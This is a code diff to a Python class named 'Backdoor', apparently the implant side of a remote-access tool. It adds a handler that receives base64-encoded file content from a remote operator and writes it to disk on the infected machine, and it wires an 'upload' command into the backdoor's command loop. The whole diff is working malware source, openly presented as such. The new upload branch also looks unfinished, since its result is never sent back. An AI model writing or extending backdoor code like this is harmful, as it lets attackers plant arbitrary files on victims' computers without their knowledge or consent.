@@ -118,12 +118,31 @@ class Backdoor:
         except IndexError:
             return indError
 
-    
+    def write_file(self,file,content): #still going to use dictionary for sendandreceive
+              
+        if isinstance(content,dict):
+            
+            if 'data' in content.keys():
+                content = content['data']
+                #print(content)
+                
+                with open(file,'wb') as write_file:
+                    write_file.write(base64.b64decode(content))
+                return (f'Successfully downloaded {file}')
+            
+            else:
+                content = content['fault']
+                #print(content)                 
+                content = base64.b64decode(content)
+                #print(type(content))
+                content = content.decode()
+                return content
+
     def run(self):
         while True:
             ##print('run1')
             self.cmdIn = self.recvStream()
-            ##print(self.cmdIn)
+            print(self.cmdIn) #list of the whole command output
             ##print('run2')
             
             if self.cmdIn[0] == 'bye':
@@ -145,6 +164,13 @@ class Backdoor:
                 #print(type(cmdOut))
                 #print(f'sending data: {type(cmdOut)}')
                 self.sendStream(cmdOut)
+            
+            elif self.cmdIn[0] == 'upload':
+                cmdOut = self.write_file(self.cmdIn[1], self.cmdIn[2]) #[1] is file name we are writing to memory, [2] is the content of the file
+                
+
+
+
             
             else:   
                 ##print('Try3')
